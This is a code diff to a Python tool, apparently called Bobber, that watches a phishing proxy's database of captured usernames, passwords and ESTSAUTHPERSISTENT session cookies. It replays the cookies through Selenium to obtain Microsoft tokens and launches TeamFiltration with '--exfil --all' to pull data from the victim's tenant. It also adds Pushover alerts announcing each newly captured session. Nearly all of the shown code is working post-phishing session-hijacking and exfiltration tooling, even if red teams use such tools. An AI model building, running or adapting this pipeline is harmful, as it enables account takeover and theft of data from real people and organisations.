@@ -1,4 +1,3 @@
-from pushover import Client
 import subprocess
 import os
 import argparse
@@ -11,6 +10,8 @@ import json
 import codecs
 import platform
 import sys
+import requests
+
 
 from selenium import webdriver
 from seleniumwire import webdriver as webdriver_wire
@@ -28,8 +29,29 @@ INFO_ICON = Fore.CYAN + "[INFO] "
 SUCCESS_ICON = Fore.GREEN + "[SUCCESS] "
 ERROR_ICON = Fore.RED + "[ERROR] "
 WARNING_ICON = Fore.YELLOW + "[WARNING] "
-pushover_configured = False
 pushClient = None
+
+class PushoverClient:
+    def __init__(self, user_key, api_token):
+        self.user_key = user_key
+        self.api_token = api_token
+
+    def send_message(self, message, title=None):
+        try:
+            data = {
+                "token": self.api_token,
+                "user": self.user_key,
+                "message": message
+            }
+            if title:
+                data["title"] = title
+            response = requests.post("https://api.pushover.net/1/messages.json", data=data)
+            if response.status_code == 200:
+                print(SUCCESS_ICON + "Pushover notification sent successfully!")
+            else:
+                print(ERROR_ICON + f"Failed to send notification, Status Code: {response.status_code} , Response: {response.text}")
+        except Exception as e:
+             print(ERROR_ICON + f"Failed to send notification {e}")
 
 class LazySeleniumAuthentication(SeleniumAuthentication):
 
@@ -58,19 +80,15 @@ class LazySeleniumAuthentication(SeleniumAuthentication):
     
 
 def is_teamfiltration_present():
-    # Determine the binary name based on the operating system
     binary_name = "TeamFiltration"
     if platform.system() == "Windows":
         binary_name += ".exe"
     
-    # Check in the current directory
     if os.path.isfile(binary_name) and os.access(binary_name, os.X_OK):
         return True
     
-    # Get the system's PATH environment variable
     system_path = os.environ.get("PATH", "")
     
-    # Check each directory in the PATH for the binary
     for directory in system_path.split(os.pathsep):
         binary_path = os.path.join(directory, binary_name)
         if os.path.isfile(binary_path) and os.access(binary_path, os.X_OK):
@@ -93,6 +111,13 @@ def extract_valid_jsons(filename):
             pass
 
     return valid_jsons
+
+def is_gecko_driver_present(geckoDriverPath):
+        selauth = LazySeleniumAuthentication(None, None, None, None)
+        service = selauth.get_service(geckoDriverPath)
+        if not service:
+            return False
+        return True
 
 def get_remote_file_mtime(ssh, remote_file):
     sftp = ssh.open_sftp()
@@ -121,9 +146,9 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
         deviceauth.verify = False
         auth.tenant = None
         #    def __init__(self, auth, deviceauth, redirurl, proxy=None):
-        print(f"Redir:{redirectUrl}")
-        print(f"res:{resourceUri}")
-        print(f"id:{clientId}")
+        #print(f"Redir:{redirectUrl}")
+        #print(f"res:{resourceUri}")
+        #print(f"id:{clientId}")
         selauth = LazySeleniumAuthentication(auth, deviceauth, redirectUrl, None)
        
 
@@ -148,23 +173,27 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
             json.dump(tokendata, outfile)
             print(INFO_ICON + f'Tokens were written to {outfilePath}')
         
-        if is_teamfiltration_present():
-            process = subprocess.Popen(f"TeamFiltration.exe --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-           
-            # Display the output as it is generated
-            while True:
-                output = process.stdout.readline()
-                if output == '' and process.poll() is not None:
-                    break
-                if output:
-                    print(output.strip())
+            if is_teamfiltration_present():
+                binary_name = "TeamFiltration"
+                if platform.system() == "Windows":
+                    binary_name += ".exe"
 
-            # Capture any remaining output
-            stdout, stderr = process.communicate()
-            if stdout:
-                print(stdout.strip())
-            if stderr:
-                print(stderr.strip(), file=sys.stderr)
+                process = subprocess.Popen(f"{binary_name} --outpath {safeUserName} --exfil --all  --roadtools {outfilePath}",  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            
+                # Display the output as it is generated
+                while True:
+                    output = process.stdout.readline()
+                    if output == '' and process.poll() is not None:
+                        break
+                    if output:
+                        print(output.strip())
+
+                # Capture any remaining output
+                stdout, stderr = process.communicate()
+                if stdout:
+                    print(stdout.strip())
+                if stderr:
+                    print(stderr.strip(), file=sys.stderr)
 
     except Exception as e:
         print(ERROR_ICON + f"Authentication error: {e}")
@@ -179,6 +208,7 @@ def process_combinations(valid_json_objects, processed_combinations):
             if username and password:
                 tokens = obj.get("tokens", {})
                 for token in tokens.values():
+                    #This can be updated and/changed to hit another or multiple cookies
                     tokenData = token.get("ESTSAUTHPERSISTENT", {}).get("Value", "")
                     if tokenData:
                         key = f"{username}:{password}"
@@ -186,16 +216,15 @@ def process_combinations(valid_json_objects, processed_combinations):
                             unique_combinations[key] = tokenData
                             print(SUCCESS_ICON + f"Found session with captured cookie for : {username}")
                             processed_combinations.add(key)
+                            
+                            if pushClient is not None:
+                                pushClient.send_message(
+                                    f"A set of credentials and session cookies have been captured for the user {username}"
+                                    , title="Bobber alert, new session!")
         except Exception as e:
             pass
 
     return unique_combinations
-
-def send_pushover_notification(username):
-    pushClient.send_message(
-        f"A set of credentials and session cookies have been captured for the user {username}"
-        , title="Bobber alert, new session!")
-    print("Notification sent successfully!")
 
 
 def monitor_remote_database(remote_info, processed_combinations, args):
@@ -276,10 +305,9 @@ if __name__ == "__main__":
     ssh_group.add_argument("--password", help="SSH password when fetching from a remote host.", required=False)
     ssh_group.add_argument("--key", default=os.path.expanduser("~/.ssh/id_rsa"), help="Path to the SSH private key file for authentication.")
 
-    parser = parser.add_argument_group('Pushover',description="Configure Pushover Notifications")
     pushover_group = parser.add_argument_group('Pushover Options', 'Options for sending Pushover notifications')
-    pushover_group.add_argument('--user-key', type=str, required=True, help='Pushover User Key')
-    pushover_group.add_argument('--api-token', type=str, required=True, help='Pushover API Token')
+    pushover_group.add_argument('--user-key', type=str, required=False, help='Pushover User Key')
+    pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')
 
     intauth_group = parser.add_argument_group('RoadTools Options', description='Options for the interactive authentication Selenium flow from RoadTools roadtx')
     intauth_group.add_argument('-c',
@@ -315,9 +343,13 @@ if __name__ == "__main__":
     args = parser.parse_args()
     processed_combinations = set()
 
+    if not is_gecko_driver_present(args.driver_path):
+        exit(0)
+    
     if args.user_key and args.api_token:
         pushover_configured=True
-        psuhClient = Client(args.user_key, api_token=args.api_token)
+        pushClient = PushoverClient(args.user_key, api_token=args.api_token)
+        print(INFO_ICON + "Pushover notifications activated!")
 
     if args.host:
         remote_info = {
@@ -331,9 +363,11 @@ if __name__ == "__main__":
         print(INFO_ICON + "SSH is enabled for remote database access. Starting to monitor the remote database file...")
         monitor_remote_database(remote_info, processed_combinations, args)
     else:
-        print(INFO_ICON + "SSH is not enabled. Monitoring local database file.")
-        valid_json_objects = extract_valid_jsons(args.database_path)
-        initial_combinations = process_combinations(valid_json_objects, processed_combinations)
-        for key, tokenData in initial_combinations.items():
-            with ThreadPoolExecutor() as executor:
-                executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
+        print(INFO_ICON + f"SSH is not enabled. Monitoring local database file {args.database_path}")
+        while True:
+            valid_json_objects = extract_valid_jsons(args.database_path)
+            initial_combinations = process_combinations(valid_json_objects, processed_combinations)
+            for key, tokenData in initial_combinations.items():
+                with ThreadPoolExecutor() as executor:
+                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.keep_open)
+            time.sleep(10000)
